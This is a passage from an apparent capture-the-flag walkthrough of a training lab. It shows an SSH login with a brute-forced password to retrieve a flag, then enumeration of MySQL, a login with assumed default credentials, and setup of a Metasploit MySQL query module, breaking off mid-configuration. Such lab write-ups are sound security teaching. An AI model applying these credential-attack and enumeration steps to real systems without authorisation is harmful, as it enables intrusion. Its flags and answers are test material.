</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span><span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> target successfully completed, <span style="color:#fab387">1</span> valid password found</span></span></code></pre></div>
<br>
<p>Great! Now, let&rsquo;s SSH into the server as the user, what is contents of smtp.txt</p>






<pre tabindex="0"><code>THM{who_knew_email_servers_were_c00l?}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh administrator@10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>The authenticity of host <span style="color:#a6e3a1">&#39;10.10.54.3 (10.10.54.3)&#39;</span> can<span style="color:#a6e3a1">&#39;t be established.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#a6e3a1">ECDSA key fingerprint is SHA256:ABheODwYmk63/Mmp8cbMSoVTNv3vcgWbzukZoGMb62I.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#a6e3a1">Are you sure you want to continue connecting (yes/no)? yes
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#a6e3a1">Warning: Permanently added &#39;</span>10.10.54.3<span style="color:#a6e3a1">&#39; (ECDSA) to the list of known hosts.
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#a6e3a1">administrator@10.10.54.3&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-111-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 03:31:06 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>System load: 0.01 Processes: <span style="color:#fab387">91</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Usage of /: 43.9% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>Memory usage: 15% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.54.3
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span><span style="color:#fab387">87</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#fab387">35</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>Last login: Wed Apr <span style="color:#fab387">22</span> 22:21:42 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>administrator@polosmtp:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>dead.letter Maildir smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>administrator@polosmtp:~$ cat smtp.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>who_knew_email_servers_were_c00l?<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
<br>
<h3 id="mysql">MySQL</h3>
<hr>
<h4 id="understanding-mysql">Understanding MySQL</h4>
<p>MySQL is a relational database management system (RDBMS) based on Structured Query Language (SQL).</p>
<p>MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.</p>
<ol>
<li>MySQL creates a database for storing and manipulating data, defining the relationship of each table.</li>
<li>Clients make requests by making specific statements in SQL.</li>
<li>The server will respond to the client with whatever information has been requested.</li>
</ol>
<br>
<p>What type of software is MySQL?</p>






<pre tabindex="0"><code>Relational Database Management System</code></pre>
<br>
What language is MySQL based on?






<pre tabindex="0"><code>SQL</code></pre>
<br>
<p>What communication model does MySQL use?</p>






<pre tabindex="0"><code>client-server</code></pre>
<br>
<p>What is a common application of MySQL?</p>






<pre tabindex="0"><code>back end database</code></pre>
<br>
<p>What major social network uses MySQL as their back-end database? This will require further research.</p>






<pre tabindex="0"><code>Facebook</code></pre>
<br>
<h4 id="enumerating-mysql">Enumerating MySQL</h4>
<p>Typically, you will have gained some initial credentials from enumerating other services that you can then use to enumerate and exploit the MySQL service. For the sake of the scenario, we&rsquo;re going to assume that we found the <code>credentials: &quot;root:password&quot;</code> while enumerating subdomains of a web server. After trying the login against SSH unsuccessfully, you decide to try it against MySQL.</p>
<br>
<p>As always, let&rsquo;s start out with a port scan, so we know what port the service we&rsquo;re trying to attack is running on. What port is MySQL using?</p>






<pre tabindex="0"><code>3306</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>PORT STATE SERVICE VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1</span></span></code></pre></div>
<br>
<p>Good, now – we think we have a set of credentials. Let&rsquo;s double check that by manually connecting to the MySQL server. We can do this using command <code>mysql -h [IP] -u [username] -p</code>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# mysql -h 10.10.151.196 -u root -p
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>Enter password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to the MySQL monitor. Commands end with ; or <span style="color:#89b4fa">\g</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Your MySQL connection id is <span style="color:#fab387">3</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Server version: 5.7.29-0ubuntu0.18.04.1 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Copyright <span style="color:#89dceb;font-weight:bold">(</span>c<span style="color:#89dceb;font-weight:bold">)</span> 2000, 2023, Oracle and/or its affiliates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>affiliates. Other names may be trademarks of their respective
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>owners.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Type <span style="color:#a6e3a1">&#39;help;&#39;</span> or <span style="color:#a6e3a1">&#39;\h&#39;</span> <span style="color:#cba6f7">for</span> help. Type <span style="color:#a6e3a1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>mysql&gt;</span></span></code></pre></div>
<br>
<p>Okay, we know that our login credentials work. Let&rsquo;s quit out of this session with &ldquo;exit&rdquo; and launch up Metasploit.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# msfconsole
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>This copy of metasploit-framework is more than two weeks old.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Consider running <span style="color:#a6e3a1">&#39;msfupdate&#39;</span> to update to the latest version.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>         .                                         .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>       <span style="color:#a6e3a1">&#39;   dB&#39;</span>                     BBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>    dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBP     dBP     dBP BB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span><span style="color:#a6e3a1">dB&#39;</span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span> dBP dBP dBP BB
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>dB<span style="color:#a6e3a1">&#39;dB&#39;</span>dB<span style="color:#a6e3a1">&#39; dBBBBP dBP dBBBBBBB
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#a6e3a1">
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#a6e3a1">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#a6e3a1">          .                  .                  dB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span><span style="color:#a6e3a1">                             |       dBP    dBBBB&#39;</span> dBP    dB<span style="color:#a6e3a1">&#39;.BP dBP    dBP
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#a6e3a1">                           --o--    dBP    dBP    dBP    dB&#39;</span>.BP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>                                                                    .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>                .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>        o                  To boldly go where no
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>                            shell has gone <span style="color:#f5e0dc">before</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>       <span style="color:#89dceb;font-weight:bold">=[</span> metasploit v6.3.5-dev-                          <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">30</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">2294</span> exploits - <span style="color:#fab387">1201</span> auxiliary - <span style="color:#fab387">410</span> post <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">31</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">968</span> payloads - <span style="color:#fab387">45</span> encoders - <span style="color:#fab387">11</span> nops <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">32</span><span>- -- --<span style="color:#89dceb;font-weight:bold">=[</span> <span style="color:#fab387">9</span> evasion <span style="color:#89dceb;font-weight:bold">]</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">33</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">34</span><span>Metasploit tip: Adapter names can be used <span style="color:#cba6f7">for</span> IP params
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">35</span><span><span style="color:#89dceb">set</span> LHOST eth0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">36</span><span>Metasploit Documentation: https://docs.metasploit.com/
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">37</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">38</span><span>msf6 &gt;</span></span></code></pre></div>
<br>
<p>We&rsquo;re going to be using the <code>mysql_sql</code> module.
Search for, select and list the options it needs. What three options do we need to set? (in descending order).</p>






<pre tabindex="0"><code>PASSWORD
RHOSTS
USERNAME</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 &gt; search mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#6c7086;font-style:italic"># Matching Modules</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic"># Name Disclosure Date Rank Check Description</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#fab387">0</span> auxiliary/admin/mysql/mysql_sql normal No MySQL SQL Generic Query
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Interact with a module by name or index. For example info 0, use <span style="color:#fab387">0</span> or use auxiliary/admin/mysql/mysql_sql
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>msf6 &gt; use <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; options
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Module options <span style="color:#89dceb;font-weight:bold">(</span>auxiliary/admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span>:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>Name Current Setting Required Description
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>---
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>PASSWORD no The password <span style="color:#cba6f7">for</span> the specified username
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>RHOSTS yes The target host<span style="color:#89dceb;font-weight:bold">(</span>s<span style="color:#89dceb;font-weight:bold">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metaspl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>oit.html
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>SQL <span style="color:#cba6f7">select</span> version<span style="color:#89dceb;font-weight:bold">()</span> yes The SQL to execute.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">28</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">29</span><span>View the full module info with the info, or info -d command.</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>admin/mysql/mysql_sql<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
